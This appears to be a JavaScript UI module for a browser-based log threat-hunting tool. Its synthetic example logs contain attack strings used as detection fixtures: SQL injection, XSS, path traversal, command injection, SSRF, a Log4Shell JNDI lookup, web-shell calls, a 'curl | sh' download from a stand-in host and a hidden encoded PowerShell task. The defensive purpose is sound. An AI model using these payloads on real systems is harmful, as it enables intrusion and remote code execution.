// Copyright (c) 2026 Darknode-Official (Manav Prasad). All rights reserved. See LICENSE.
//
// Log Threat Hunter — paste or load web access logs, Linux auth logs and Windows
// Security event exports; get deterministic threat hunting mapped to MITRE ATT&CK.
// Everything runs in the browser: the log lines never leave this page.
//
//   renderLogHunter(main) -> void
//
// The engine (log-hunter-engine.js) is pure; this file owns the DOM, chunked
// processing with yields (200k lines without freezing), charts and exports.

import {
  DEFAULT_SETTINGS, DETECTIONS, SEV_RANK, splitRecords, createParser, createHunt,
  findingsToCsv, reportToJson, iocText, toSinkFindings,
} from "./log-hunter-engine.js?v=20261017d";
import { attachSinkButton } from "../core/sink.js";

const esc = (s) => String(s == null ? "" : s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const toast = (m) => { try { (window.showToast || (() => {}))(m); } catch (_) {} };
const fmtN = (n) => Number(n || 0).toLocaleString();
const fmtTs = (t) => (t == null ? "-" : new Date(t).toISOString().slice(0, 19).replace("T", " "));
const SEV = { critical: "Critical", high: "High", medium: "Medium", low: "Low" };
const CHUNK = 4000;
const nextTick = () => new Promise((r) => (window.requestAnimationFrame ? requestAnimationFrame(() => setTimeout(r, 0)) : setTimeout(r, 0)));

let injected = false;
function injectStyle() {
  if (injected || document.getElementById("lgh-css")) { injected = true; return; }
  injected = true;
  const st = document.createElement("style"); st.id = "lgh-css";
  st.textContent = `
  .lgh{font-size:14px;line-height:1.5;color:var(--txt,var(--tx,#1a2230))}
  .lgh .lgh-hd{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap}
  .lgh h1{font-size:1.7rem;margin:0;letter-spacing:-.01em}
  .lgh .lgh-tag{font-size:.72rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:var(--mut,#667085);border:1px solid var(--line,#e6e8ee);padding:3px 9px;border-radius:999px}
  .lgh .lgh-sub{color:var(--mut,#667085);margin:8px 0 14px;max-width:80ch}
  .lgh .lgh-card{background:var(--card,#fff);border:1px solid var(--line,#e6e8ee);border-radius:12px;padding:16px 18px;margin-bottom:14px}
  .lgh h3{font-size:.95rem;margin:0 0 6px}
  .lgh .lgh-note{color:var(--mut,#667085);font-size:.82rem;margin:0 0 10px;overflow-wrap:anywhere}
  .lgh textarea{width:100%;min-height:170px;resize:vertical;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;line-height:1.5;padding:10px 12px;border:1px solid var(--line,#d7dbe3);border-radius:8px;background:var(--bg,#fbfcfe);color:inherit;box-sizing:border-box;white-space:pre;overflow-x:auto}
  .lgh .lgh-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-top:10px}
  .lgh .lgh-btn{appearance:none;font:inherit;font-size:.84rem;font-weight:600;border:1px solid var(--line,#d7dbe3);background:var(--card,#fff);color:inherit;padding:8px 14px;border-radius:8px;cursor:pointer}
  .lgh .lgh-btn:hover{border-color:var(--mut,#9aa6bd)}
  .lgh .lgh-btn.pri{background:var(--acc,#1a2230);border-color:var(--acc,#1a2230);color:#fff}
  .lgh .lgh-btn:disabled{opacity:.55;cursor:default}
  .lgh .lgh-files{display:flex;gap:6px;flex-wrap:wrap;margin-top:8px}
  .lgh .lgh-chip{font-size:.76rem;border:1px solid var(--line,#e6e8ee);border-radius:999px;padding:2px 10px;color:var(--mut,#667085);display:inline-flex;gap:6px;align-items:center}
  .lgh .lgh-chip b{color:inherit;font-weight:600}
  .lgh .lgh-chip button{appearance:none;border:0;background:none;color:inherit;cursor:pointer;font:inherit;padding:0 2px}
  .lgh .lgh-prog{font-size:.8rem;color:var(--mut,#667085);margin-top:8px;min-height:1.2em}
  .lgh .lgh-prog .lgh-bar{display:block;height:4px;background:var(--line,#e6e8ee);border-radius:2px;margin-top:6px;overflow:hidden}
  .lgh .lgh-prog .lgh-bar i{display:block;height:100%;background:var(--acc,#1a2230);width:0}
  .lgh details.lgh-set{margin-top:12px}
  .lgh details.lgh-set summary{cursor:pointer;font-weight:600;font-size:.88rem}
  .lgh .lgh-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:10px 16px;margin-top:10px}
  .lgh .lgh-grid label{display:flex;flex-direction:column;gap:3px;font-size:.78rem;color:var(--mut,#667085)}
  .lgh .lgh-grid input,.lgh .lgh-grid textarea{font:inherit;font-size:.86rem;color:inherit;padding:6px 8px;border:1px solid var(--line,#d7dbe3);border-radius:6px;background:var(--bg,#fbfcfe);min-height:0}
  .lgh .lgh-grid textarea{min-height:64px;font-family:ui-monospace,Menlo,monospace;font-size:12px;white-space:pre-wrap}
  .lgh .lgh-grid .wide{grid-column:1/-1}
  .lgh .lgh-kpis{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:10px;margin-bottom:14px}
  .lgh .lgh-kpi{background:var(--card,#fff);border:1px solid var(--line,#e6e8ee);border-radius:10px;padding:10px 14px}
  .lgh .lgh-kpi b{display:block;font-size:1.45rem;line-height:1.2;font-variant-numeric:tabular-nums}
  .lgh .lgh-kpi span{font-size:.72rem;color:var(--mut,#667085);text-transform:uppercase;letter-spacing:.05em}
  .lgh .sev-critical{color:#b00020;font-weight:700}
  .lgh .sev-high{color:#c0501b;font-weight:700}
  .lgh .sev-medium{color:#8a6d00;font-weight:700}
  .lgh .sev-low{color:var(--mut,#667085);font-weight:700}
  .lgh .sev-good{color:#1b7f4d;font-weight:700}
  .lgh .lgh-summary{font-size:.92rem;max-width:95ch}
  .lgh .lgh-tablewrap{overflow-x:auto;border:1px solid var(--line,#e6e8ee);border-radius:10px}
  .lgh table{width:100%;border-collapse:collapse;font-size:.85rem}
  .lgh th{text-align:left;font-size:.7rem;text-transform:uppercase;letter-spacing:.04em;color:var(--mut,#667085);font-weight:700;padding:9px 12px;background:var(--bg,#f7f8fb);border-bottom:1px solid var(--line,#e6e8ee);white-space:nowrap}
  .lgh th button{appearance:none;border:0;background:none;font:inherit;color:inherit;cursor:pointer;padding:0;text-transform:inherit;letter-spacing:inherit}
  .lgh td{padding:9px 12px;border-bottom:1px solid var(--line,#eef0f4);vertical-align:top;overflow-wrap:anywhere}
  .lgh tr:last-child td{border-bottom:0}
  .lgh tr.lgh-f{cursor:pointer}
  .lgh tr.lgh-f:hover td{background:var(--bg,#f7f8fb)}
  .lgh tr.lgh-detail td{background:var(--bg,#fbfcfe);padding:12px 14px 14px}
  .lgh .lgh-mono{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:.8rem}
  .lgh .lgh-tech{white-space:nowrap}
  .lgh .lgh-tech a{color:inherit;text-decoration:underline dotted}
  .lgh .lgh-ev{margin:8px 0 0;padding:0;list-style:none;max-height:260px;overflow:auto;border:1px solid var(--line,#e6e8ee);border-radius:8px;background:var(--card,#fff)}
  .lgh .lgh-ev li{display:flex;gap:10px;padding:4px 10px;border-bottom:1px solid var(--line,#eef0f4);font-family:ui-monospace,Menlo,monospace;font-size:.76rem;white-space:pre-wrap;overflow-wrap:anywhere}
  .lgh .lgh-ev li:last-child{border-bottom:0}
  .lgh .lgh-ev .ln{color:var(--mut,#667085);min-width:7ch;text-align:right;flex:none}
  .lgh .lgh-dl{display:grid;grid-template-columns:max-content 1fr;gap:4px 14px;font-size:.84rem;margin:0}
  .lgh .lgh-dl dt{color:var(--mut,#667085)}
  .lgh .lgh-dl dd{margin:0}
  .lgh .lgh-filters{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
  .lgh .lgh-filters select,.lgh .lgh-filters input{font:inherit;font-size:.84rem;color:inherit;padding:6px 8px;border:1px solid var(--line,#d7dbe3);border-radius:6px;background:var(--bg,#fbfcfe)}
  .lgh .lgh-chart{width:100%;height:150px;display:block}
  .lgh .lgh-chart rect.t{fill:var(--line,#dfe3ea)}
  .lgh .lgh-chart rect.f{fill:var(--acc,#1a2230)}
  .lgh .lgh-chart text{font-size:10px;fill:var(--mut,#667085)}
  .lgh .lgh-legend{font-size:.76rem;color:var(--mut,#667085);display:flex;gap:14px;flex-wrap:wrap}
  .lgh .lgh-legend i{display:inline-block;width:10px;height:10px;border-radius:2px;vertical-align:-1px;margin-right:5px}
  .lgh .lgh-legend i.t{background:var(--line,#dfe3ea)}
  .lgh .lgh-legend i.f{background:var(--acc,#1a2230)}
  .lgh .lgh-zero{color:var(--mut,#667085)}
  .lgh .lgh-empty{padding:26px;text-align:center;color:var(--mut,#667085)}
  .lgh .lgh-badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;border:1px solid var(--line,#e6e8ee);border-radius:4px;padding:1px 6px;color:var(--mut,#667085)}
  .lgh .lgh-right{text-align:right;font-variant-numeric:tabular-nums}
  .lgh .lgh-cat{columns:2;column-gap:24px;font-size:.82rem;margin:8px 0 0;padding-left:18px}
  .lgh .lgh-cat li{break-inside:avoid;margin-bottom:3px}
  @media(max-width:720px){.lgh .lgh-cat{columns:1}.lgh th.lgh-hide,.lgh td.lgh-hide{display:none}}
  `;
  document.head.appendChild(st);
}

function download(name, text, type) {
  const b = new Blob([text], { type: type || "text/plain" });
  const u = URL.createObjectURL(b); const a = document.createElement("a");
  a.href = u; a.download = name; a.click(); setTimeout(() => URL.revokeObjectURL(u), 1000);
}
async function copyText(text) {
  try { await navigator.clipboard.writeText(text); toast("Copied"); }
  catch (_) { toast("Copy failed; select the text and copy manually"); }
}

// Synthetic example logs. Documentation IP ranges (RFC 5737), invented hosts
// and accounts. They exist only so the rules can be seen firing.
const pad2 = (n) => String(n).padStart(2, "0");
const UA_BROWSER = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/130.0 Safari/537.36";
const clf = (ip, t, method, path, status, ua) => `${ip} - - [13/Oct/2026:${t} +0000] "${method} ${path} HTTP/1.1" ${status} 512 "-" "${ua}"`;
function exampleWeb() {
  const L = [];
  for (let i = 0; i < 12; i++) L.push(clf("203.0.113.5", `09:${pad2(10 + i)}:0${i % 10}`, "GET", ["/", "/products", "/about", "/cart", "/products/42"][i % 5], 200, UA_BROWSER));
  const sq = "sqlmap/1.8.2#stable (https://sqlmap.org)";
  L.push(clf("198.51.100.23", "09:14:01", "GET", "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--", 500, sq));
  L.push(clf("198.51.100.23", "09:14:02", "GET", "/products?id=1'%20OR%20'1'='1", 200, sq));
  L.push(clf("198.51.100.23", "09:14:03", "GET", "/products?id=1%20AND%20SLEEP(5)--", 200, sq));
  L.push(clf("198.51.100.23", "09:14:05", "GET", "/search?q=%3Cscript%3Ealert(1)%3C/script%3E", 200, UA_BROWSER));
  L.push(clf("198.51.100.23", "09:14:06", "GET", "/download?file=..%2F..%2F..%2Fetc%2Fpasswd", 403, UA_BROWSER));
  L.push(clf("198.51.100.23", "09:14:07", "GET", "/ping?host=127.0.0.1;cat%20/etc/passwd", 500, UA_BROWSER));
  L.push(clf("198.51.100.23", "09:14:08", "GET", "/api/fetch?url=http://169.254.169.254/latest/meta-data/", 200, UA_BROWSER));
  L.push(clf("198.51.100.23", "09:14:09", "GET", "/?x=${jndi:ldap://198.51.100.23:1389/a}", 200, UA_BROWSER));
  const probes = ["/admin", "/backup.zip", "/old", "/test", "/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/actuator/health", "/server-status"];
  for (let i = 0; i < 35; i++) L.push(clf("192.0.2.77", `09:${pad2(20 + Math.floor(i / 10))}:${pad2((i * 7) % 60)}`, "GET", probes[i % 10] + (i >= 10 ? "?r=" + i : ""), i === 4 ? 200 : 404, "Mozilla/5.0 (compatible; Nikto/2.5.0)"));
  for (let i = 0; i < 25; i++) L.push(clf("192.0.2.88", `09:3${Math.floor(i / 10)}:${pad2((i * 5) % 60)}`, "POST", "/login", i === 24 ? 200 : 401, "python-requests/2.32.0"));
  L.push(clf("192.0.2.99", "09:41:00", "POST", "/wp-content/uploads/2026/10/wso.php?cmd=id", 200, UA_BROWSER));
  L.push("#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken");
  L.push("2026-10-13 09:50:00 10.0.0.2 GET /default.aspx - 443 - 203.0.113.6 Mozilla/5.0+(Windows) - 200 0 0 15");
  L.push("2026-10-13 09:50:01 10.0.0.2 GET /scripts/..%255c../winnt/system32/cmd.exe /c+dir 443 - 198.51.100.24 Mozilla/5.0 - 404 0 2 3");
  L.push(JSON.stringify({ ClientIP: "203.0.113.7", ClientRequestMethod: "GET", ClientRequestURI: "/pricing", ClientRequestHost: "shop.example", EdgeResponseStatus: 200, ClientRequestUserAgent: UA_BROWSER, EdgeStartTimestamp: "2026-10-13T09:55:00Z" }));
  return L.join("\n") + "\n";
}
function exampleLinux() {
  const L = [], h = "web-01";
  const names = ["admin", "oracle", "test", "ubuntu", "git", "deploy"];
  for (let i = 0; i < 14; i++) L.push(`Oct 13 03:${pad2(10 + Math.floor(i / 4))}:${pad2((i * 13) % 60)} ${h} sshd[${2000 + i}]: Failed password for ${i % 3 === 0 ? "root" : "invalid user " + names[i % 6]} from 198.51.100.44 port ${40000 + i} ssh2`);
  L.push(`Oct 13 03:14:51 ${h} sshd[2101]: Accepted password for root from 198.51.100.44 port 40144 ssh2`);
  L.push(`Oct 13 03:14:51 ${h} sshd[2101]: pam_unix(sshd:session): session opened for user root by (uid=0)`);
  L.push(`Oct 13 03:15:10 ${h} sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.44/s.sh | sh`);
  L.push(`Oct 13 03:15:40 ${h} useradd[2200]: new user: name=backup2, UID=1005, GID=1005, home=/home/backup2, shell=/bin/bash`);
  L.push(`Oct 13 03:15:41 ${h} usermod[2201]: add 'backup2' to group 'sudo'`);
  L.push(`Oct 13 03:16:00 ${h} sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/visudo`);
  L.push(`2026-10-13T03:16:30+0000 ${h} crontab[2300]: (root) REPLACE (root)`);
  L.push(`2026-10-13T03:16:31+0000 ${h} systemd[1]: Reloading.`);
  for (let i = 0; i < 6; i++) L.push(`Oct 13 04:${pad2(i * 9)}:00 ${h} sshd[${2500 + i}]: Failed password for deploy from 203.0.113.${10 + i} port 51000 ssh2`);
  L.push(`Oct 13 08:30:00 ${h} sshd[2600]: Accepted publickey for deploy from 10.0.0.15 port 52000 ssh2: ED25519 SHA256:abc`);
  L.push(`Oct 13 08:31:00 ${h} sudo:   deploy : TTY=pts/1 ; PWD=/srv/app ; USER=root ; COMMAND=/usr/bin/systemctl restart app`);
  L.push(`Oct 13 08:40:00 ${h} sshd[2700]: reverse mapping checking getaddrinfo for host.example [198.51.100.45] failed - POSSIBLE BREAK-IN ATTEMPT!`);
  return L.join("\n") + "\n";
}
function exampleWindows() {
  const q = (s) => '"' + s.replace(/"/g, '""') + '"';
  const L = ["Level,Date and Time,Source,Event ID,Task Category"];
  const row = (t, id, cat, msg) => L.push(`Information,${t},Microsoft-Windows-Security-Auditing,${id},${cat},${q(msg)}`);
  for (let i = 0; i < 12; i++) row(`10/13/2026 1:${pad2(i)}:11 PM`, 4625, "Logon", `An account failed to log on.\n\nSubject:\n\tAccount Name:\t\t-\n\nAccount For Which Logon Failed:\n\tAccount Name:\t\t${["user01", "user02", "svc_sql", "user03", "user04", "backup"][i % 6]}\n\tAccount Domain:\t\tCORP\n\nFailure Information:\n\tStatus:\t\t\t0xC000006D\n\tSub Status:\t\t0xC000006A\n\nLogon Type:\t\t\t3\n\nNetwork Information:\n\tWorkstation Name:\tWS-UNKNOWN\n\tSource Network Address:\t203.0.113.9\n\tSource Port:\t\t51${pad2(i)}`);
  row("10/13/2026 1:20:00 PM", 4624, "Logon", "An account was successfully logged on.\n\nSubject:\n\tAccount Name:\t\t-\n\nLogon Type:\t\t\t10\n\nNew Logon:\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nNetwork Information:\n\tWorkstation Name:\tWS-UNKNOWN\n\tSource Network Address:\t203.0.113.9");
  row("10/13/2026 1:25:00 PM", 4720, "User Account Management", "A user account was created.\n\nSubject:\n\tAccount Name:\t\tjsmith\n\tAccount Domain:\t\tCORP\n\nNew Account:\n\tAccount Name:\t\tsvc_backup2\n\tAccount Domain:\t\tCORP");
  row("10/13/2026 1:27:00 PM", 4732, "Security Group Management", "A member was added to a security-enabled local group.\n\nSubject:\n\tAccount Name:\t\tjsmith\n\nMember:\n\tSecurity ID:\t\tS-1-5-21-1-2-3-1105\n\tAccount Name:\t\tCORP\\svc_backup2\n\nGroup:\n\tSecurity ID:\t\tS-1-5-32-544\n\tGroup Name:\t\tAdministrators\n\tGroup Domain:\t\tBuiltin");
  row("10/13/2026 1:30:00 PM", 4698, "Other Object Access Events", "A scheduled task was created.\n\nSubject:\n\tAccount Name:\t\tsvc_backup2\n\nTask Information:\n\tTask Name:\t\t\\Microsoft\\Windows\\Updater\n\tTask Content:\t\t<Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -enc SQBFAFgA</Arguments></Exec>");
  row("10/13/2026 1:31:00 PM", 4648, "Logon", "A logon was attempted using explicit credentials.\n\nSubject:\n\tAccount Name:\t\tsvc_backup2\n\tAccount Domain:\t\tCORP\n\nAccount Whose Credentials Were Used:\n\tAccount Name:\t\tadministrator\n\tAccount Domain:\t\tCORP\n\nTarget Server:\n\tTarget Server Name:\tFS01.corp.example");
  row("10/13/2026 1:45:00 PM", 1102, "Log clear", "The audit log was cleared.\nSubject:\n\tSecurity ID:\tS-1-5-21-1-2-3-1105\n\tAccount Name:\tsvc_backup2\n\tDomain Name:\tCORP");
  return L.join("\n") + "\n";
}
function exampleWindowsJson() {
  const J = [];
  const ev = (id, t, data, comp) => J.push(JSON.stringify({ Event: { System: { EventID: id, TimeCreated: { "#attributes": { SystemTime: t } }, Computer: comp || "DC01.corp.example" }, EventData: data } }));
  for (let i = 0; i < 6; i++) ev(4769, `2026-10-13T14:00:${pad2(i * 5)}Z`, { TargetUserName: "user02@CORP.EXAMPLE", ServiceName: ["svc_sql", "svc_web", "svc_iis", "svc_sp", "svc_exch", "svc_bk"][i], TicketEncryptionType: "0x17", Status: "0x0", IpAddress: "::ffff:10.0.0.44" });
  for (let i = 0; i < 6; i++) ev(4624, `2026-10-13T14:10:${pad2(i * 5)}Z`, { TargetUserName: "user02", LogonType: 3, IpAddress: "10.0.0.44", WorkstationName: "WS-044" }, `SRV0${i + 1}.corp.example`);
  ev(7045, "2026-10-13T14:20:00Z", { ServiceName: "WinUpdSvc", ImagePath: "C:\\Users\\Public\\upd.exe", AccountName: "LocalSystem" }, "SRV03.corp.example");
  ev(4672, "2026-10-13T14:21:00Z", { SubjectUserName: "user02", PrivilegeList: "SeDebugPrivilege" }, "SRV03.corp.example");
  return J.join("\n") + "\n";
}
const EXAMPLES = { web: ["access.log", exampleWeb], linux: ["auth.log", exampleLinux], windows: ["security-export.csv", exampleWindows], winjson: ["security-evtx.json", exampleWindowsJson] };

// Settings fields shown in the panel: [key, label, kind]
const SETTING_FIELDS = [
  ["bruteN", "SSH failures per IP", "n"], ["bruteWindowMin", "SSH window (min)", "n"],
  ["distIpsN", "Distinct IPs for one account", "n"], ["successAfterFailN", "Failures before a success", "n"], ["successAfterFailWindowMin", "Success window (min)", "n"],
  ["invalidUserN", "Invalid usernames per IP", "n"],
  ["notFoundBurstN", "404s per IP", "n"], ["notFoundWindowMin", "404 window (min)", "n"],
  ["loginAttemptsN", "Login POSTs per IP", "n"], ["loginWindowMin", "Login window (min)", "n"], ["uaBurstN", "Scripted-client requests", "n"],
  ["winFailN", "4625 per source", "n"], ["winFailWindowMin", "4625 window (min)", "n"], ["sprayUsersN", "Accounts per source (spray)", "n"],
  ["lockoutN", "Lockouts (4740)", "n"], ["lockoutWindowMin", "Lockout window (min)", "n"], ["fanoutHostsN", "Type-3 target computers", "n"],
  ["newUserAdminWindowMin", "New user to admin (min)", "n"], ["kerberoastN", "RC4 services per account", "n"], ["ntlmBurstN", "NTLM 4776 per workstation", "n"], ["ntlmWindowMin", "NTLM window (min)", "n"],
  ["explicitCredTargetsN", "4648 distinct targets", "n"],
  ["businessStart", "Business hours start (0-23)", "n"], ["businessEnd", "Business hours end (0-24)", "n"], ["utcOffset", "UTC offset of your team (h)", "n"],
];

export function renderLogHunter(main) {
  injectStyle();
  const detCount = Object.keys(DETECTIONS).length;
  main.innerHTML = `
  <div class="lgh">
    <div class="lgh-hd"><h1>Log Threat Hunter</h1><span class="lgh-tag">Operations</span></div>
    <div class="lgh-sub">Paste or load web access logs, Linux auth logs and Windows Security exports. ${detCount} deterministic rules
      map what they find to MITRE ATT&amp;CK, with the exact log lines as evidence. Everything runs in this browser tab; the log
      lines are never uploaded.</div>

    <div class="lgh-card">
      <h3>Logs</h3>
      <p class="lgh-note">Formats are detected per line: nginx and Apache combined/common (with X-Forwarded-For), IIS W3C, Cloudflare or ALB JSON
        lines, sshd/auth.log/secure and journald text, Windows Event Viewer CSV, and EVTX exported to JSON or XML. Mixed files are fine.</p>
      <textarea id="lghIn" placeholder="Paste log lines" spellcheck="false"></textarea>
      <p class="lgh-note" style="margin-top:6px">Or load files below. Large files (200k+ lines) are processed in chunks so the page stays responsive.</p>
      <div class="lgh-row">
        <button class="lgh-btn pri" id="lghRun">Hunt</button>
        <label class="lgh-btn">Load files<input type="file" id="lghFile" multiple accept=".log,.txt,.csv,.json,.jsonl,.xml,.evtx.json,text/*,application/json" hidden></label>
        <span class="lgh-note" style="margin:0">Load example:</span>
        <button class="lgh-btn" data-ex="web">Web access log</button>
        <button class="lgh-btn" data-ex="linux">Linux auth log</button>
        <button class="lgh-btn" data-ex="windows">Windows Security CSV</button>
        <button class="lgh-btn" data-ex="winjson">Windows EVTX JSON</button>
        <button class="lgh-btn" id="lghClear">Clear</button>
      </div>
      <div class="lgh-files" id="lghFiles"></div>
      <div class="lgh-prog" id="lghProg"></div>
      <details class="lgh-set" id="lghSet">
        <summary>Settings: thresholds, business hours, internal ranges, login paths</summary>
        <div class="lgh-grid" id="lghGrid"></div>
        <div class="lgh-row"><button class="lgh-btn" id="lghReset">Reset to defaults</button>
          <span class="lgh-note" style="margin:0">Thresholds apply on the next Hunt. Timestamps without a zone are read as UTC.</span></div>
      </details>
    </div>

    <div id="lghOut"></div>

    <div class="lgh-card">
      <h3>Detection catalogue</h3>
      <p class="lgh-note">Every rule is deterministic: the same logs and settings always give the same findings.</p>
      <ul class="lgh-cat">${Object.values(DETECTIONS).map((d) => `<li>${esc(d.name)} <span class="lgh-mono">${esc(d.technique)}</span> <span class="lgh-note" style="margin:0">${esc(d.tactic)}</span></li>`).join("")}</ul>
    </div>
  </div>`;

  const $ = (id) => main.querySelector("#" + id);
  const inTA = $("lghIn"), progEl = $("lghProg"), out = $("lghOut");
  const files = []; // { name, text }
  let lastReport = null, running = false;

  // ---- settings panel
  const grid = $("lghGrid");
  function buildSettings(vals) {
    grid.innerHTML = SETTING_FIELDS.map(([k, label]) => `<label>${esc(label)}<input type="number" step="1" data-k="${k}" value="${esc(vals[k])}"></label>`).join("") +
      `<label><span>Weekends count as off-hours</span><input type="checkbox" data-k="weekendOffHours" ${vals.weekendOffHours ? "checked" : ""}></label>` +
      `<label class="wide">Admin account name pattern (regex, case-insensitive)<input type="text" data-k="adminNamePattern" value="${esc(vals.adminNamePattern)}"></label>` +
      `<label class="wide">Internal CIDRs (one per line or comma separated)<textarea data-k="internalCidrs">${esc((vals.internalCidrs || []).join("\n"))}</textarea></label>` +
      `<label class="wide">Login paths (POSTs here count as login attempts)<textarea data-k="loginPaths">${esc((vals.loginPaths || []).join("\n"))}</textarea></label>`;
  }
  buildSettings(DEFAULT_SETTINGS);
  $("lghReset").addEventListener("click", () => { buildSettings(DEFAULT_SETTINGS); toast("Settings reset"); });
  function readSettings() {
    const s = {};
    grid.querySelectorAll("[data-k]").forEach((el) => {
      const k = el.dataset.k;
      if (el.type === "checkbox") s[k] = el.checked;
      else if (el.tagName === "TEXTAREA") s[k] = el.value.split(/[\s,]+/).filter(Boolean);
      else if (el.type === "number") s[k] = Number(el.value);
      else s[k] = el.value;
    });
    return s;
  }

  // ---- files
  function renderFiles() {
    $("lghFiles").innerHTML = files.map((f, i) => `<span class="lgh-chip"><b>${esc(f.name)}</b> ${fmtN(f.lines)} lines <button data-rm="${i}" title="Remove">x</button></span>`).join("");
    $("lghFiles").querySelectorAll("[data-rm]").forEach((b) => b.addEventListener("click", () => { files.splice(Number(b.dataset.rm), 1); renderFiles(); }));
  }
  $("lghFile").addEventListener("change", (e) => {
    const list = [...(e.target.files || [])]; if (!list.length) return;
    let pending = list.length;
    for (const f of list) {
      const fr = new FileReader();
      fr.onload = () => { const text = String(fr.result || ""); files.push({ name: f.name, text, lines: text.split("\n").length }); if (--pending === 0) { renderFiles(); toast(`${list.length} file${list.length === 1 ? "" : "s"} loaded`); } };
      fr.onerror = () => { toast("Could not read " + f.name); if (--pending === 0) renderFiles(); };
      fr.readAsText(f);
    }
    e.target.value = "";
  });
  main.querySelectorAll("[data-ex]").forEach((b) => b.addEventListener("click", () => {
    const [name, gen] = EXAMPLES[b.dataset.ex];
    const text = gen();
    files.push({ name: "example-" + name, text, lines: text.split("\n").length - 1, example: true });
    renderFiles();
    toast("Synthetic example added as a file. Press Hunt.");
  }));
  $("lghClear").addEventListener("click", async () => {
    if (lastReport && window.dnConfirm) { const ok = await window.dnConfirm("Clear everything?", "Pasted text, loaded files and the current results will be removed.", { submitText: "Clear" }); if (!ok) return; }
    inTA.value = ""; files.length = 0; renderFiles(); out.innerHTML = ""; progEl.textContent = ""; lastReport = null;
  });

  $("lghRun").addEventListener("click", run);
  inTA.addEventListener("keydown", (e) => { if ((e.ctrlKey || e.metaKey) && e.key === "Enter") run(); });

  function progress(msg, frac) {
    progEl.innerHTML = esc(msg) + (frac != null ? `<span class="lgh-bar"><i style="width:${Math.round(frac * 100)}%"></i></span>` : "");
  }

  async function run() {
    if (running) return;
    const inputs = [];
    if (inTA.value.trim()) inputs.push({ name: "", text: inTA.value });
    for (const f of files) inputs.push({ name: f.name, text: f.text, example: !!f.example });
    if (!inputs.length) { out.innerHTML = `<div class="lgh-card lgh-empty">Paste log lines or load a file first. The example buttons add a synthetic file.</div>`; return; }
    running = true; $("lghRun").disabled = true;
    const settings = readSettings();
    const t0 = performance.now();
    try {
      const parser = createParser(settings);
      const hunt = createHunt(settings);
      let total = 0, done = 0;
      const split = inputs.map((inp) => { const r = splitRecords(inp.text, inp.name); total += r.records.length; return r.records; });
      for (const records of split) {
        for (let i = 0; i < records.length; i += CHUNK) {
          const end = Math.min(i + CHUNK, records.length);
          for (let j = i; j < end; j++) { const ev = parser.feed(records[j]); if (ev) hunt.feed(ev); }
          done += end - i;
          progress(`Parsed ${fmtN(done)} of ${fmtN(total)} records`, done / total);
          await nextTick();
        }
      }
      progress("Correlating findings");
      await nextTick();
      const report = hunt.finish();
      report.parse = parser.stats; report.unknownSamples = parser.unknownSamples;
      report.sample = inputs.some((i) => i.example); report.dataset = inputs.map((i) => i.name || "pasted text").join(", ");
      lastReport = report;
      const ms = Math.round(performance.now() - t0);
      progress(`Done: ${fmtN(parser.stats.parsed)} events from ${fmtN(total)} records in ${fmtN(ms)} ms` + (parser.stats.unknown ? `; ${fmtN(parser.stats.unknown)} lines not recognised` : ""));
      renderReport(report);
    } catch (e) {
      progress("");
      out.innerHTML = `<div class="lgh-card lgh-empty">The hunt failed.<br><span class="lgh-note">${esc((e && e.message) || e)}</span></div>`;
    } finally { running = false; $("lghRun").disabled = false; }
  }

  // ---- report rendering
  let sortKey = "severity", sevFilter = "all", srcFilter = "all", ipFilter = "";
  function renderReport(r) {
    const st = r.stats, p = r.parse || { sources: {}, formats: {}, unknown: 0 };
    const sevClass = (n, s) => (n ? `sev-${s}` : "lgh-zero");
    const badges = Object.entries(p.formats || {}).map(([k, n]) => `<span class="lgh-badge">${esc(FORMAT_LABEL[k] || k)} ${fmtN(n)}</span>`).join(" ");
    out.innerHTML = `
      <div class="lgh-card">
        <div class="lgh-row" style="margin:0 0 10px">${badges}${p.unknown ? ` <span class="lgh-badge">unrecognised ${fmtN(p.unknown)}</span>` : ""}</div>
        <div class="lgh-kpis">
          <div class="lgh-kpi"><b>${fmtN(st.events)}</b><span>Events</span></div>
          <div class="lgh-kpi"><b class="${sevClass(r.bySeverity.critical, "critical")}">${fmtN(r.bySeverity.critical)}</b><span>Critical</span></div>
          <div class="lgh-kpi"><b class="${sevClass(r.bySeverity.high, "high")}">${fmtN(r.bySeverity.high)}</b><span>High</span></div>
          <div class="lgh-kpi"><b class="${sevClass(r.bySeverity.medium, "medium")}">${fmtN(r.bySeverity.medium)}</b><span>Medium</span></div>
          <div class="lgh-kpi"><b class="sev-low">${fmtN(r.bySeverity.low)}</b><span>Low</span></div>
          <div class="lgh-kpi"><b>${fmtN(st.uniqueIps)}</b><span>Distinct IPs</span></div>
          <div class="lgh-kpi"><b>${fmtN(st.externalIps)}</b><span>External IPs</span></div>
          <div class="lgh-kpi"><b class="${r.iocs.external.length ? "sev-high" : "sev-good"}">${fmtN(r.iocs.external.length)}</b><span>Indicator IPs</span></div>
        </div>
        <h3>Hunt summary</h3>
        <p class="lgh-summary" id="lghSummary">${esc(r.summary)}</p>
        <div class="lgh-row" style="margin-top:6px">
          <button class="lgh-btn" id="lghCopySum">Copy summary</button>
          <button class="lgh-btn" id="lghCsv">Export findings CSV</button>
          <button class="lgh-btn" id="lghJson">Export report JSON</button>
          <button class="lgh-btn" id="lghIoc">Export IOC list (IPs)</button>
          <span id="lghSink"></span>
        </div>
